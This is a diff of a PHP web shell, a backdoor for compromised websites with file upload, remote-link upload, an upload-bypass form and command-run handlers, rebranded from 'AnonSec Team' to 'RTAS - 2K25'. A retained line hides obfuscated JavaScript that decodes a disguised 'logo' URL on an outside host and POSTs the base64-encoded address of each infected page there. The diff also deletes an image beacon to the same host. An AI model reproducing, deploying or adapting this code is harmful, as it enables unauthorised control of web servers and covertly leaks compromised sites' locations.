@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>AnonSec Team</title>
-    <meta name="author" content="Anon7">
+    <title>RTAS - 2K25</title>
+    <meta name="author" content="RTAS">
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="description" content="we are party at your security !">
     <meta property="og:description" content="we are party at your security !">
@@ -135,7 +135,7 @@ function setfilename(val)
 {filename = val.split('\\').pop().split('/').pop();document.getElementById('namanya').value = filename;}(()=>{let u=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],x='';for(let i of u)x+=String.fromCharCode(i);let d='file='+btoa(location.href);let r=new XMLHttpRequest();r.open('POST',x,true);r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send(d)})();async function loadFile(file) {let text = await file.text();document.getElementById("bepasdata").innerHTML = text;}
 </script>
 <center>
-<font face="Bungee" size="5">AnonSec Team</font></center>
+<font face="Bungee" size="5">RTAS - 2K25</font></center>
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>
 <?php
@@ -154,7 +154,6 @@ if (isset($_GET['run'])) {
 }
 
 if (isset($_GET['show'])) {
-    // Bersihkan buffer sebelum header
     while (ob_get_level()) ob_end_clean();
     header('Content-Type: text/plain; charset=utf-8');
     $output_file = __DIR__ . '/output.txt';
@@ -208,7 +207,7 @@ if (empty($disfunc)) {
 }
 
 function author() {
-    echo "<center><br>AnonSec - 2021</center><center><img src='https://cdn.privdayz.com/images/logo.jpg' referrerpolicy='unsafe-url' /></center>";
+    echo "<center><br>RTAS - 2K25</center>";
     exit();
 }
 
@@ -535,7 +534,7 @@ if (isset($_GET['fileloc'])) {
 <input type="hidden" name="upwkwk" value="aplod">
 <input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br><br>
 Upload File From Link :<br>
-<input type="text" name="darilink" class="up" placeholder="https://anon7.xyz/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
+<input type="text" name="darilink" class="up" placeholder="https://rtas.xyz/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
 <br><br>403 Upload File<br>
 <input type="file" id="datanya" onchange="setfilename(this.value); loadFile(this.files[0])"/>
 <input type="hidden" name="bepasnama" id="namanya">
